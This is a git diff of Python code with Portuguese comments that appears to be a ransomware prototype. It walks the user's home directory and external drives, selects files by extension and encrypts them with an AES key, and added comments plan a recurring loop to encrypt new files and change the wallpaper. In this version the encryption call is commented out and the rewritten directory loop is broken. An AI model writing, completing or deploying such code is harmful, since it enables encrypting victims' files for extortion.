@@ -64,6 +64,10 @@ def get_usuario():
 '''
 NOVAS COISAS :
  - arquivo na area de trabalho com todos os arquivos criptografados.
+ - rotina  -> (depois de criptografar tudo):
+    de 1 em 1 minuto
+    checar se tem algum arquivo novo -> salvar todos os arquivos numa lista. se tiver novo arquivo -> criptografa ele
+    trocar o wallpaper dnv
 '''
 
 # ponto de partida da criptografia
@@ -75,7 +79,7 @@ def menu(senha_AES):
     # caminho de partida
     home = os.environ['HOME']
     listar(senha_AES,home,tipos_arquivos)
-    listar_media(senha_AES,tipos_arquivos)
+    #listar_media(senha_AES,tipos_arquivos)
 
 # função que lista e criptografa HD'S externos e pendrives
 def listar_media(senha_AES, tipos_arq):
@@ -89,24 +93,27 @@ def listar_media(senha_AES, tipos_arq):
 def listar(chave_AES,diretorio, tipos_arq):
     atual = os.getcwd()
     ignorar = diretorio + '/.avfs'
-    for caminho, diret, arquivo in os.walk(diretorio):
-        print(caminho)
-        if(caminho == diretorio + '/.avfs'):
-            print('achou')
-        for arq in arquivo:
-            a = caminho+'/'+arq
-            extensao = os.path.splitext(a)
-            for ext in tipos_arq:
-                if(extensao[1] == ext):
-                    if(caminho == atual):
-                        ignorar = 1
-                    else:
-                        a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                        try:
-                            pass
-                            #criptografa(chave_AES, a)
-                        except:
-                            print('erro ao criptografar-> ' +str(a))
+    listagem_dos_diretorios = os.listdir(os.environ['HOME'])
+    for elemento in listagem_dos_diretorios:
+        if(elemento == '.avfs'):
+            listagem_dos_diretorios.remove('.avfs') # remorção de diretorio virtual
+
+    for elemento in listagem_dos_diretorios:
+        for caminho, diret, arquivo in elemento:
+            for arq in arquivo:
+                a = caminho+'/'+arq
+                extensao = os.path.splitext(a)
+                for ext in tipos_arq:
+                    if(extensao[1] == ext):
+                        if(caminho == atual):
+                            ignorar = 1
+                        else:
+                            a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                            try:
+                                pass
+                                #criptografa(chave_AES, a)
+                            except:
+                                print('erro ao criptografar-> ' +str(a))
 
 
 
